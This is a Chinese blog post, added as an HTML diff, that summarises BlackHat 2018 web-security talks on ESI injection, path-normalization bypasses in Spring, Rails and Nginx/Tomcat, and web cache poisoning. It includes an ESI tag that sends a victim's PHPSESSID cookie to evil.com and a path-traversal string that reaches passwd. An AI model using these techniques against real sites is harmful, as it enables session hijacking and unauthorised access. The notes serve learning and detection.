@@ -1,0 +1,478 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,BlackHat,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>BlackHat 2018 Web小结 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        BlackHat 2018 Web小结
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-04-19T17:15:47.000Z">
+        2020-04-20
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BlackHat/">BlackHat</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近整理下BlackHat 2018 Web相关议题，做下学习笔记。</p>
+<h2 id="0x01-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）"><a href="#0x01-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）" class="headerlink" title="0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）"></a>0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）</h2><p>PDF：</p>
+<p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf</a></p>
+<p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking-wp.pdf</a></p>
+<p>其他参考：</p>
+<p><a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection" target="_blank" rel="noopener">https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection</a></p>
+<p><a href="https://xz.aliyun.com/t/5159" target="_blank" rel="noopener">浅析Edge Side Include注入（上）</a></p>
+<p><a href="https://xz.aliyun.com/t/5261" target="_blank" rel="noopener">浅析Edge Side Include注入（下）</a></p>
+<h3 id="何为ESI"><a href="#何为ESI" class="headerlink" title="何为ESI"></a>何为ESI</h3><p>ESI全称Edge Side Includes，是一种数据缓冲/缓存服务器，它提供将Web网页的部分（这里指页面的片段）进行缓冲/缓存的技术及服务。</p>
+<p>ESI语言是基于XML标签的标记语言，用于改善HTTP中间件加载大量Web内容缓存时造成的性能下降。使用ESI标签可以指示反向代理服务器（或缓存服务器）获取已缓存Web页面模版的更多信息。传递给客户端的这些信息可能还来自另一台服务器（非后端服务器），该服务器可以完全缓存包含动态内容的页面。</p>
+<p>如图，对于大型网站来说，页面很多部分其实都是静态的东西，部分是动态的比如天气信息等，网站为了提高性能将静态的内容缓存到前端的反向代理服务器中，将ESI指令发送给服务器端，然后在反向代理服务器进行内容的解析拼接后返回给浏览器：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/1.png" alt=""></p>
+<h3 id="ESI-Demo"><a href="#ESI-Demo" class="headerlink" title="ESI Demo"></a>ESI Demo</h3><p>如下，使用ESI语言的”Include”在page1中包含page2并展示在页面中：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/2.png" alt=""></p>
+<p>最终在浏览器端显示的是如下已经解析成功的内容，即用户访问page1的时候同时看到了page2的内容：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/3.png" alt=""></p>
+<p>整个ESI语言解析流程如图：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/4.png" alt=""></p>
+<p>当然，ESI语言也支持更多的常量来设置常用的变量值：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/5.png" alt=""></p>
+<h3 id="ESI注入攻击原理"><a href="#ESI注入攻击原理" class="headerlink" title="ESI注入攻击原理"></a>ESI注入攻击原理</h3><p>由前面可知，ESI通过允许开发人员用ESI标签替换页面的动态部分来增加缓存灵活性。ESI标签在Web应用的服务端发送，在Web应用的代理服务器解析，这种看似不可控的模式难道不存在安全风险吗？</p>
+<p><strong>HTTP代理服务器无法区分后端服务器提供的合法ESI标签和HTTP响应中注入的恶意标签。也就是说，如果攻击者能够在HTTP响应中注入恶意ESI标签，那么代理服务器将会无差别地去解析和执行它们。</strong></p>
+<p>还是这个图，在第三步中，Web应用服务器给缓存服务器发送ESI语言，要求缓存服务器执行ESI语言，问题在于第一步客户端给Web应用服务器发送请求时，其中就插入了恶意ESI标签，这样的话到第三步的时候缓存服务器执行ESI语言时就会将恶意的ESI标签一并执行了：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/4.png" alt=""></p>
+<h3 id="ESI注入攻击——SSRF"><a href="#ESI注入攻击——SSRF" class="headerlink" title="ESI注入攻击——SSRF"></a>ESI注入攻击——SSRF</h3><p>如图，后端服务器将客户端传来的ESI标签payload传给代理服务器，代理服务器执行了ESI标签payload，并将完整的响应发送给了客户端：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/6.png" alt=""></p>
+<h3 id="ESI注入攻击——绕过XSSFilter"><a href="#ESI注入攻击——绕过XSSFilter" class="headerlink" title="ESI注入攻击——绕过XSSFilter"></a>ESI注入攻击——绕过XSSFilter</h3><p>绕过XSSFilter的payload：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/9.png" alt=""></p>
+<p><code>&lt;esi:assign&gt;</code>标签可以操作存储在服务端ESI变量中的任意值。<code>$(变量名)</code>操作符可以访问这个变量的值。</p>
+<p>上述的注入在浏览器页面中实际返回如下，能成功绕过XSSFilter的过滤：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/10.png" alt=""></p>
+<p>此外，某些服务器不支持ESI vars标签，此时可以通过SSRF来进行XSS攻击：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/E:/software/hexo/blog/source/_posts/BlackHat-2018-Web%E5%B0%8F%E7%BB%93/11.png" alt=""></p>
+<h3 id="ESI注入攻击——无JS窃取HttpOnly-Cookie"><a href="#ESI注入攻击——无JS窃取HttpOnly-Cookie" class="headerlink" title="ESI注入攻击——无JS窃取HttpOnly Cookie"></a>ESI注入攻击——无JS窃取HttpOnly Cookie</h3><p>如下，PHP脚本中插入了ESI标签，该标签获取phpsessid值并输出在页面上，同时PHP会接收GET请求的city参数输出在页面上。这里使用<code>&lt;esI:vars&gt;</code>标签来输出Cookie常量即可实现无JS窃取这个HttpOnly Cookie：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/7.png" alt=""></p>
+<p>进一步，可以使用ESI的include标签使得代理服务器把phpsessid发送给攻击者的服务器中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;esi:include src=&quot;http://evil.com/?cookie=$(HTTP_COOKIE&#123;&apos;PHPSESSID&apos;&#125;)&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>接着，在攻击者服务器的日志中就能接收到PHPSESSID了：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/8.png" alt=""></p>
+<h3 id="各应用支持情况"><a href="#各应用支持情况" class="headerlink" title="各应用支持情况"></a>各应用支持情况</h3><p><img src="/2020/04/20/BlackHat-2018-Web小结/12.png" alt=""></p>
+<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>在项目中可使用同样的payload来测试是否支持ESI注入，当注入的ESI原样返回时，则存在问题：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/13.png" alt=""></p>
+<p>也可以使用自动化扫描工具来发现：</p>
+<ul>
+<li>Burp ActiveScan++</li>
+<li>Burp Upload Scanner</li>
+<li>Acunetix </li>
+</ul>
+<h2 id="0x02-Breaking-Parser-Logic-Take-Your-Path-Normalization-off-and-Pop-0days-Out"><a href="#0x02-Breaking-Parser-Logic-Take-Your-Path-Normalization-off-and-Pop-0days-Out" class="headerlink" title="0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!"></a>0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!</h2><p>PDF：<a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
+<h3 id="路径归一化盲区"><a href="#路径归一化盲区" class="headerlink" title="路径归一化盲区"></a>路径归一化盲区</h3><p>一般的，在对外部输入字符串校验之前，需要使用java.text.Normalizer的normalize()方法先对其进行归一化（Unicode Normalization）处理。<strong>归一化可以确保具有相同意义的字符串具有统一的二进制描述。</strong></p>
+<p>但是归一化处理会存在一个问题，即Inconsistency，前后不一致。具体的说，就是路径检查器和路径解析器之间的解析存在不一致，从而导致存在安全问题，使得一些安全机制被绕过。</p>
+<p>归一化的不一致表现在各个方面。</p>
+<h4 id="不同OS不一致"><a href="#不同OS不一致" class="headerlink" title="不同OS不一致"></a>不同OS不一致</h4><p>如下是不同OS上表现的不一致，在Windows下会被解析为一个UNC地址，而在Linux下则是一个URL：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/14.png" alt=""></p>
+<h4 id="不同编码不一致"><a href="#不同编码不一致" class="headerlink" title="不同编码不一致"></a>不同编码不一致</h4><p>在不同编码中表现不一致也存在一样的问题，比如代码不允许使用”secadmin”来查询数据库，但是如果数据库编码为utf8_general_ci（utf8_general_cs和utf8_bin均不行），则可以使用”ßecadmin”来绕过检测。</p>
+<p>几个编码区别如下：</p>
+<ul>
+<li>utf8_general_ci：不区分大小写，这个你在注册用户名和邮箱的时候就要使用；</li>
+<li>utf8_general_cs：区分大小写，如果用户名和邮箱用这个 就会照成不后果；</li>
+<li>utf8_bin：字符串每个字符串用二进制数据编译存储。 区分大小写，而且可以存二进制的内容；</li>
+</ul>
+<h4 id="归一化顺序不同"><a href="#归一化顺序不同" class="headerlink" title="归一化顺序不同"></a>归一化顺序不同</h4><p>在某些开发场景中，会对外部传入的URL参数先调用过滤如<code>..</code>、<code>/</code>、<code>\</code>等特殊字符的黑明单过滤函数进行过滤，再使用Normalizer.normalize()函数进行归一化处理。这种颠倒的顺序会导致容易被编码绕过。</p>
+<h4 id="Q-E"><a href="#Q-E" class="headerlink" title="..\Q/\E"></a>..\Q/\E</h4><p>你能看出getAsset()函数的安全问题吗？</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/15.png" alt=""></p>
+<p>Pattern.quote(str)函数返回值为<code>\Qstr\E</code>，\Q代表字面内容的开始，\E代表字面内容的结束，也就是说返回值使str没有任何正则表达式意义，即使其中含有正则表达式内容也被转变为字符串常量：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/16.png" alt=""></p>
+<p>问题在哪看个例子就知道了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String path = <span class="string">"file:///root/../\\Q/\\Epasswd"</span>;</span><br><span class="line">        String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator);</span><br><span class="line">        String DIRECTIVE_FILE_SEPARATOR = <span class="string">"/"</span>;</span><br><span class="line">        path = path.replace(QUOTED_FILE_SEPARATOR, DIRECTIVE_FILE_SEPARATOR);</span><br><span class="line">        System.out.println(path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/17.png" alt=""></p>
+<h4 id="Nginx斜杠绕过"><a href="#Nginx斜杠绕过" class="headerlink" title="Nginx斜杠绕过"></a>Nginx斜杠绕过</h4><p>作者举的例子，路径<code>/static</code>被命中则会访问<code>/home/app/static/</code>下的资源文件，即相当于路径检查器；但是Nginx会自动在这种特殊路径<code>../</code>前加上斜杠，导致预设的路径<code>/home/app/static/</code>被穿越了：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/18.png" alt=""></p>
+<p>此外，作者介绍了自己盲测的payload：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/19.png" alt=""></p>
+<p>最终获取到非预设目录的其他文件：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/20.png" alt=""></p>
+<p>出于这种思路，作者发现了如下CVE：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/21.png" alt=""></p>
+<h3 id="深入代码审计现存的应用"><a href="#深入代码审计现存的应用" class="headerlink" title="深入代码审计现存的应用"></a>深入代码审计现存的应用</h3><h4 id="Spring-0day-CVE-2018-1271"><a href="#Spring-0day-CVE-2018-1271" class="headerlink" title="Spring 0day - CVE-2018-1271"></a>Spring 0day - CVE-2018-1271</h4><p>这是个运行在Windows系统上的Spring路径穿越漏洞。</p>
+<p>如图，如果传入的路径包含危险字符<code>..</code>就调用cleanPath()函数进行处理：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/22.png" alt=""></p>
+<p>cleanPath()函数的作用是将包含<code>..</code>的这种相对路径转换成绝对路径，比如<code>/foo/bar/../</code>经过处理后变成<code>/foo/</code>：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/23.png" alt=""></p>
+<p>而该函数的问题在于第四行，其是允许空元素存在的。也就是说，cleanPath()函数会把<code>//</code>当成是一个目录，但是Windows系统是不会把<code>//</code>当成一个目录的，这就存在二义性问题了。</p>
+<p>如下是作者测试时的payload对比结果：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/24.png" alt=""></p>
+<p>通过这种不一致，实现Windows任意文件读取，payload如下：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/25.png" alt=""></p>
+<h4 id="Rails-0day-CVE-2018-3760"><a href="#Rails-0day-CVE-2018-3760" class="headerlink" title="Rails 0day - CVE-2018-3760"></a>Rails 0day - CVE-2018-3760</h4><p>如图，在Rails这个Web框架中，当传入的URL中存在<code>file://</code>字符串时会被认为是绝对路径；随后使用URL编码来绕过双斜杠归一化；接着在split_file_uri()方法中对传入的URL进行解码：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/26.png" alt=""></p>
+<p>如下，URL进来后，会调用forbidden_request()函数对传入的path进行检查：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/27.png" alt=""></p>
+<p>在forbidden_request()函数中，如果path包含<code>..</code>则认为是危险路径：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/28.png" alt=""></p>
+<p>如果请求中包含<code>..</code>即返回真，然后返回forbidden_response(env)信息：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/29.png" alt=""></p>
+<p>如果传入的path没有包含危险字符<code>..</code>，那么继续跟踪会来到split_file_uri()函数，这里如果传入双重URL编码后的<code>.</code>最终会被解码，这就导致了前面的forbidden_request()函数形同虚设了：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/30.png" alt=""></p>
+<p>最后，作者指出文件若是以<code>.erb</code>结尾，则会执行erb里面的命令，因此这是个RCE漏洞：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/31.png" alt=""></p>
+<h3 id="新的多层架构攻击面"><a href="#新的多层架构攻击面" class="headerlink" title="新的多层架构攻击面"></a>新的多层架构攻击面</h3><p>反向代理架构带来很多好处，比如资源共享、负载均衡、高速缓存、统一入口提高安全性等。</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/32.png" alt=""></p>
+<p>但是如果反向代理服务器遇到如下畸形URL时，它们的二义性将导致安全问题的产生：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/33.png" alt=""></p>
+<p>当然，仅仅是开个玩笑而已：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/34.png" alt=""></p>
+<p>危害主要是可以绕过黑白名单的ACL限制、逃逸上下文匹配等：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/35.png" alt=""></p>
+<p>这个问题是在默认设置下发现的，也就是说如果用到了下面提到的反向代理模块就可能已经中招了：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/36.png" alt=""></p>
+<p>在反向代理架构中，Tomcat对<code>/..;/</code>认知存在问题：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/37.png" alt=""></p>
+<p>通过<code>/..;/</code>可以绕过ACL、逃逸到上级路径访问管理接口：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/38.png" alt=""></p>
+<p>如下，有个管理后台需要登录认证才能访问：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/39.png" alt=""></p>
+<p>通过测试观察发现，该站点是使用Nginx做反向代理服务器，使用Tomcat做后端服务器：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/40.png" alt=""></p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/41.png" alt=""></p>
+<p>此时在URL中注入<code>/..;/</code>时，Nginx和Tomcat对该URL的认知就存在二义性：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/42.png" alt=""></p>
+<p>利用二义性就能未授权访问修改密码页面了：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/43.png" alt=""></p>
+<p>通过cmf或者后台界面样式，可以识别出基于Railo开发的管理台，Railo支持自定义模板，通过这个功能进一步取得shell权限：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/44.png" alt=""></p>
+<h2 id="0x03-WebAssembly-A-New-World-of-Native-Exploits-on-the-Browser（WebAssembly：浏览器漏洞的新世界）"><a href="#0x03-WebAssembly-A-New-World-of-Native-Exploits-on-the-Browser（WebAssembly：浏览器漏洞的新世界）" class="headerlink" title="0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）"></a>0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）</h2><p>PDF：</p>
+<p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf</a></p>
+<p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf</a></p>
+<p>其他参考：</p>
+<p><a href="https://xz.aliyun.com/t/3672" target="_blank" rel="noopener">WebAssembly的安全性问题–Part 1</a></p>
+<p><a href="https://xz.aliyun.com/t/3673" target="_blank" rel="noopener">WebAssembly的安全性问题–Part 2</a></p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>WebAssembly是由W3C社区组开发的一项新技术。WebAssembly允许开发人员将他们本机的C/C++代码带到浏览器，代码由最终用户以接近本机的性能运行。WebAssembly已经在所有主流浏览器的最新版本中得到广泛支持，目前正在许多基于Web的服务中被使用。值得注意的例子包括3D模型渲染，界面设计和可视化数据处理。 WebAssembly仍处于开发的早期阶段，开发人员很可能会在未来发现新的用法。</p>
+<p>WebAssembly(Wasm)是一种机器语言(可能应该被命名为“WebBytecode”)，被设计在有限的虚拟机上运行(想想JVM，而不是VMware)。然后可以将此虚拟机嵌入到其他程序(尤其是浏览器)中。Wasm虚拟机与程序或系统的其他部分隔离，只能通过特殊枚举的导入和导出与其宿主程序进行通信。大多数程序不会由作者直接在Wasm中编写，甚至也不会以用户友好的文本格式编写。其目标是把其他语言编译成Wasm。Wasm已经相对完整，可以让用户从低级语言中获得的许多功能。</p>
+<p>Emscripten是目前最流行的WebAssembly编译器工具链，是Mozilla的Alon Zakai开发的一个独特LLVM后端，可以将任意LLVM中间码编译成JavaScript，大大简化了现有代码在Web时代的重用。简单地说，Emscripten就是可以把C/C++代码编译可执行代码在HTML上运行。</p>
+<p>在本次议题中，作者介绍了在Emscripten上发现为增强WebAssembly而引入的新方法所带来的新漏洞，这些漏洞可以劫持控制流，甚至在网页上下文中执行任意JavaScript代码。</p>
+<p>更多的解说看先知文章即可，这里没Demo也不copy了。</p>
+<h2 id="0x04-Practical-Web-Cache-Poisoning-Redefining-‘Unexploitable’（缓存投毒攻击）"><a href="#0x04-Practical-Web-Cache-Poisoning-Redefining-‘Unexploitable’（缓存投毒攻击）" class="headerlink" title="0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）"></a>0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）</h2><p>PDF：</p>
+<p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf</a></p>
+<p>PortSwigger官方博客参考：</p>
+<p><a href="https://portswigger.net/research/practical-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/research/practical-web-cache-poisoning</a></p>
+<h3 id="Web缓存和投毒"><a href="#Web缓存和投毒" class="headerlink" title="Web缓存和投毒"></a>Web缓存和投毒</h3><p>现在很多Web站点都使用了缓存技术来加速访问速度，比如浏览器本地缓存、DNS缓存等等。</p>
+<p>如图，第一个用户访问a页面，第二、三个用户也访问a页面，缓存服务器会把第一个用户访问的a页面内容传给第二、三个用户：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/45.png" alt=""></p>
+<p>那么问题来了，如何区分请求是不是同一个呢？这是缓存服务器需要继续解决的。不可能对请求的每一个字节都匹配校验，比如在不同浏览器请求同一个页面，就会造成User-Agent不同，但实际上这是需要返回缓存页面内容的：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/46.png" alt=""></p>
+<p>此时，Cache Key出现了，缓存服务器通过标记某个位置来判断请求是否一致。如下图，通过请求接口URL和Host，在缓存服务器上算出一个Hash值，对于每个请求，如果请求接口URL和Host算出来的Hash值是同一个，则返回之前的缓存。此时会将用户A的访问数据传递给用户B，但实际上用户A和用户B的身份是不一样的：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/47.png" alt=""></p>
+<p>作者指出，可以在返回报文头中使用Vary来告知客户端哪个是Cache Key的，但是实际测试过程中发现大型的CDN服务商都忽略了Vary。同时，他还发现了许多Web缓存服务器其实支持基于很多其他请求头来缓存页面内容，并且这些请求不在Cache Key的范围。换句话说，<strong>就是攻击者可以通过构造特殊请求头向缓存页面注入恶意内容</strong>。</p>
+<p>如图，作者提出的一个查找Web缓存投毒攻击的攻击流程：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/48.png" alt=""></p>
+<p>首先使用BurpSuite的扩展插件Param Miner对特殊请求头进行模糊查找，原理是使用高级差异逻辑和二进制搜索技术，可以为每个请求猜测多大65000个参数名，还可以收集捕获流量中其他的参数作为模糊查找的字典。这一步可以找出被测接口中可以注入恶意内容的特殊请求头。</p>
+<p>当找到特殊请求头后就开始评估危害了，注入恶意代码到缓存服务器中，当受害者命中Cache规则时，缓存服务器会把相应的恶意缓存返回给受害者：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/49.png" alt=""></p>
+<h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><h4 id="Basic-Poisoning"><a href="#Basic-Poisoning" class="headerlink" title="Basic Poisoning"></a>Basic Poisoning</h4><p>Cache Key在X-Forwarded-Host头，注入点在响应内容的meta标签的content属性值中。</p>
+<p>在检测阶段，发现关键的Cache Key是X-Forwarded-Host头：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/50.png" alt=""></p>
+<p>接着进入评估和注入阶段，通过X-Forwarded-Host头注入XSS payload到缓存服务器上。此时当其他用户访问同样的URL时，都会受到XSS攻击：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/51.png" alt=""></p>
+<h4 id="Discreet-poisoning"><a href="#Discreet-poisoning" class="headerlink" title="Discreet poisoning"></a>Discreet poisoning</h4><p>Cache Key在X-Host头，注入点在响应内容的script标签的src属性值中：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/52.png" alt=""></p>
+<h4 id="Selective-Poisoning"><a href="#Selective-Poisoning" class="headerlink" title="Selective Poisoning"></a>Selective Poisoning</h4><p>响应包的Vary头告知我们User-Agent头是作为Cache Key的一部分的。这意味着，由于我们声称使用的是Firefox 60，因此我们的漏洞利用将仅提供给其他Firefox 60用户，也就是说这种攻击场景更有选择性。</p>
+<p>通过X-Forwarded-Host头注入在响应内容的link标签的href属性值中：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/53.png" alt=""></p>
+<h4 id="DOM-Poisoning"><a href="#DOM-Poisoning" class="headerlink" title="DOM Poisoning"></a>DOM Poisoning</h4><p>如下，可以控制body标签的data-site-root属性值，但并不能进行XSS攻击，冰球不清楚该属性的用途。为了解决这个问题，作者在Burp中创建了一个匹配和替换规则，向所有请求添加了<code>X-Forwarded-Host：id.burpcollaborator.net</code>头，然后浏览了该站点。加载某些页面后，Firefox将JavaScript生成的请求发送到作者的服务器：：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/54.png" alt=""></p>
+<p>上述URL路径表明，在网站上的某个地方，有JavaScript代码使用data-site-root属性来决定从何处加载某些国际化数据。作者试图通过获取<code>https://catalog.data.gov/api/i18n/en</code>来找出这些数据应该是什么样，但是只收到了一个空的JSON响应。幸运的是，将“ en”更改为“ es”给出了一个线索。该文件包含用于将短语翻译成用户所选语言的映射。通过创建自己的翻译文件并使用缓存中毒将用户指向该文件，我们可以将短语翻译为XSS payload从而实现XSS攻击：</p>
+<p><img src="/2020/04/20/BlackHat-2018-Web小结/55.png" alt=""></p>
+<h4 id="其他更多的案例"><a href="#其他更多的案例" class="headerlink" title="其他更多的案例"></a>其他更多的案例</h4><p>参考官方的PDF文档即可。</p>
